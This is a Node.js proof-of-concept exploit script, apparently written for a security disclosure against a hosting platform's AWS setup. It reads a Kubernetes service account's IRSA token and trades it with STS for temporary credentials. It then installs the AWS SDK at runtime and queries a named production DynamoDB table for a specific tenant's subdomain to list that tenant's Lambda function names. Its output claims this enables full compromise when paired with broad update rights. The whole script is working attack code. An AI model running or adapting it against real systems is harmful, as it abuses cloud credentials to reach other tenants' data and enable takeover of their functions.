const fs = require('fs');
const https = require('https');

function b64urlDecode(s) {
  return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}

console.log('=== POC: DynamoDB Query with subdomain-only to enumerate all functions ===\n');
console.log('1. Extracting IRSA identity...');
console.log('   AWS_ROLE_ARN =', process.env.AWS_ROLE_ARN);
console.log('   AWS_WEB_IDENTITY_TOKEN_FILE =', process.env.AWS_WEB_IDENTITY_TOKEN_FILE);

const tokenPath = process.env.AWS_WEB_IDENTITY_TOKEN_FILE;
if (!tokenPath || !fs.existsSync(tokenPath)) {
  console.log('   ERROR: No IRSA token file found\n');
  process.exit(1);
}

const token = fs.readFileSync(tokenPath, 'utf8').trim();
const payload = JSON.parse(b64urlDecode(token.split('.')[1]));
console.log('   ✓ Token subject:', payload.sub);
console.log('   ✓ Token audience:', Array.isArray(payload.aud) ? payload.aud[0] : payload.aud);

// Step 1: AssumeRoleWithWebIdentity to get temp credentials
console.log('\n2. Assuming cd-tekton-worker role via STS...');
const roleArn = process.env.AWS_ROLE_ARN;
const region = process.env.AWS_REGION || 'eu-central-1';
const stsParams = new URLSearchParams({
  Action: 'AssumeRoleWithWebIdentity',
  Version: '2011-06-15',
  RoleArn: roleArn,
  RoleSessionName: 'poc-session',
  WebIdentityToken: token,
}).toString();

https.get(`https://sts.${region}.amazonaws.com/?${stsParams}`, res => {
  let body = '';
  res.on('data', c => body += c);
  res.on('end', () => {
    try {
      const xml = body;
      const accessKeyMatch = xml.match(/<AccessKeyId>([^<]+)<\/AccessKeyId>/);
      const secretKeyMatch = xml.match(/<SecretAccessKey>([^<]+)<\/SecretAccessKey>/);
      const sessionTokenMatch = xml.match(/<SessionToken>([^<]+)<\/SessionToken>/);

      if (!accessKeyMatch || !secretKeyMatch || !sessionTokenMatch) {
        console.log('   ERROR: Failed to extract credentials from STS response');
        process.exit(1);
      }

      const creds = {
        accessKeyId: accessKeyMatch[1],
        secretAccessKey: secretKeyMatch[1],
        sessionToken: sessionTokenMatch[1],
      };
      console.log('   ✓ Got temporary credentials');

      // Step 2: Install AWS SDK and use it to Query DynamoDB
      console.log('\n3. Installing AWS SDK for DynamoDB client...');
      const { exec } = require('child_process');
      exec('npm install --loglevel=error --prefix /tmp/dynamo-sdk @aws-sdk/client-dynamodb@latest', (err, stdout, stderr) => {
        if (err) {
          console.log('   ERROR: Failed to install SDK:', err.message);
          process.exit(1);
        }
        console.log('   ✓ SDK installed');

        // Now use the SDK to Query DynamoDB with just the subdomain
        console.log('\n4. Querying DynamoDB with subdomain-only to enumerate all functions...');

        const { DynamoDBClient, QueryCommand } = require('/tmp/dynamo-sdk/node_modules/@aws-sdk/client-dynamodb');

        const client = new DynamoDBClient({
          region: region,
          credentials: {
            accessKeyId: creds.accessKeyId,
            secretAccessKey: creds.secretAccessKey,
            sessionToken: creds.sessionToken,
          },
        });




        // Query the routing table with ONLY the Tenant (subdomain) key
        // This should return ALL functions for this subdomain without knowing function names
        const subdomain = 'fsudktxishllphxeibqs';
        const tableName = 'nhost-production-tenants-functions';

        console.log('   Target table:', tableName);
        console.log('   Query key (Tenant):', subdomain);
        console.log('   (No function names provided — we\'re enumerating based on subdomain alone)\n');

        const command = new QueryCommand({
          TableName: tableName,
          KeyConditionExpression: 'Tenant = :tenant',
          ExpressionAttributeValues: {
            ':tenant': { S: subdomain },
          },
          ProjectionExpression: 'Route,Lambda,AppID',
        });

        client.send(command)
          .then(response => {
            if (!response.Items || response.Items.length === 0) {
              console.log('   ℹ️  Query returned no items (table might be empty or key mismatch)');
              return;
            }

            console.log('   ✓ SUCCESS: Enumerated all functions via subdomain-only query!\n');
            console.log('   Found ' + response.Items.length + ' function(s) for subdomain ' + subdomain + ':\n');

            response.Items.forEach((item, idx) => {
              const route = item.Route?.S || 'unknown';
              const lambda = item.Lambda?.S || 'unknown';
              const appId = item.AppID?.S || 'unknown';
              console.log(`   [${idx + 1}] Route: ${route}`);
              console.log(`       Lambda (function name): ${lambda}`);
              console.log(`       AppID: ${appId}\n`);
            });

            console.log('   ⚠️  CRITICAL: Subdomain alone is sufficient to:');
            console.log('       1. Enumerate ALL functions for any tenant');
            console.log('       2. Get the exact Lambda function names (no sha256 guessing needed)');
            console.log('       3. Combined with lambda:UpdateFunctionCode on Resource:*, enables full compromise');
          })
          .catch(error => {
            console.log('   ERROR:', error.message);
            if (error.$metadata?.httpStatusCode === 400) {
              console.log('   (400 Bad Request — table name or key schema might be wrong)');
            }
          });
      });

    } catch (e) {
      console.log('   ERROR:', e.message);
      process.exit(1);
    }
  });
}).on('error', e => {
  console.log('   ERROR: STS call failed:', e.message);
  process.exit(1);
});
